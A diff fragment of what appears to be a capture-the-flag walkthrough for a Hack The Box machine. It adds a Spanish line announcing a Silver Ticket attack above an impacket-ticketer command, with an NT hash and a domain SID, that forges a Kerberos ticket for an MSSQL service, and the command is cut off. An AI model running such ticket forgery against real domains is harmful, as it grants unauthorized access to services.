@@ -230,7 +230,7 @@ Get-LocalUser -Name $env:USERNAME | Select sid
 ![[Pasted image 20240329181459.png]]
 
 ### MSSQL service
-
+ahora vamos a craftear un  Silver Ticket attack
 ```python
 impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-
 4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn
